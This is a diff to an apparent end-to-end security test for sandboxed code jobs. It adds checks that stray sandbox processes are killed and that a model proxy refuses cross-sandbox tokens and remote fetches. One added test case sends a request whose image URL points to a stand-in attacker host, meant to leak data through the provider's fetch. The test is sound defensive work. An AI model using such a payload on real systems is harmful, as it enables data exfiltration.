@@ -149,6 +149,16 @@ def main() -> int:
     }
     (work / "a" / "workspace" / "opencode.json").write_text(json.dumps(hostile))
 
+    # -- the kill sweep on its own: a sandbox-user process outside every service tree --
+    subprocess.run(["docker", "exec", "-d", "-u", "gem", a, "setsid", "env", "-i", "sh", "-c", "sleep 777"], check=True)
+    time.sleep(1)
+    check("positive control: the stray process runs", True, dexec(a, "pgrep -fc '[s]leep 777'", user="gem").strip() not in ("", "0"))
+    from app.gateway.code_jobs.runner import Running
+
+    manager._kill(Running(job_id="sweep-test", ops=ops["a"]))
+    check("the kill sweep ends a stray sandbox-user process (no group, no marker)", "0", dexec(a, "pgrep -fc '[s]leep 777'", user="gem").strip() or "0")
+    check("the sandbox's own API survives the sweep", (0, True), (lambda r: (r[0], "alive" in r[1]))(ops["a"].sh("echo alive")))
+
     async def scenario() -> None:
         # -- egress and secrets, while a real job runs ------------------------------------
         brief = CodeJobBrief(goal="[scenario:egress] check the network and write hello.txt", project_dir="e2e", verify_command="test -s hello.txt", expect_files=["hello.txt"])
@@ -195,9 +205,13 @@ def main() -> int:
         check("the provider saw only the proxy-injected key", True, bool(seen) and all(h == f"Bearer {PROVIDER_KEY}" for h in seen))
 
         # -- the check's exit status is the sandbox API's, and leftovers die first --
-        quick = await manager.run(thread_id="a", user_id="u", tool_call_id="quick", brief=CodeJobBrief(goal="[scenario:quick] nothing", project_dir="e2e", verify_command="exit 3"))
-        check("a failing check fails the job whatever the worker wrote", ("failed", 3), (quick.status, (store.get(quick.job_id).result or {}).get("verify", {}).get("exit_code")))
+        quick = await manager.run(thread_id="a", user_id="u", tool_call_id="quick", brief=CodeJobBrief(goal="[scenario:quick] nothing", project_dir="e2e", verify_command="pgrep -f '[s]leep 999' >/dev/null && exit 9; exit 3"))
+        alive = next((st for st in store.steps(quick.job_id) if st["kind"] == "command" and "pgrep" in st["command"]), {})
+        check("positive control: the leftovers ran and were alive while the worker ran", True, alive.get("exit_code") == 0 and alive.get("output", "").strip().startswith(("1", "2")))
+        # exit 3, not 9: no leftover was alive when the check ran.
+        check("a failing check fails the job whatever the worker wrote, and leftovers were gone before it", ("failed", 3), (quick.status, (store.get(quick.job_id).result or {}).get("verify", {}).get("exit_code")))
         check("the worker's leftover process is gone before the check", "0", dexec(a, "pgrep -fc '[s]leep 300'", user="gem").strip() or "0")
+        check("a leftover that left the group and cleared its environment is gone too", "0", dexec(a, "pgrep -fc '[s]leep 999'", user="gem").strip() or "0")
 
         # -- token scope -----------------------------------------------------------------------
         hold = asyncio.create_task(manager.run(thread_id="a", user_id="u", tool_call_id="hold", brief=CodeJobBrief(goal="[scenario:hold] hold", project_dir="e2e")))
@@ -223,6 +237,8 @@ def main() -> int:
         check("the same token from another sandbox is refused", "403", curl(names["b"], token))
         check("no token is refused", "401", curl(names["b"], None))
         check("another model is refused", "400", curl(a, token, '{"model":"gpt-5","messages":[]}'))
+        fetch = '{"model":"worker","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://attacker.example/?d=x"}}]}]}'
+        check("a remote URL the provider would fetch is refused", "400", curl(a, token, fetch))
         probe = f"wget -q -T 5 -O - --header 'authorization: Bearer x' {url} >/dev/null 2>&1 && echo reached || echo unreachable"
         off = subprocess.run(["docker", "exec", OUTSIDER, "sh", "-c", probe], capture_output=True, text=True, timeout=30).stdout.strip()
         check("the proxy is unreachable off the sandbox network", "unreachable", off)
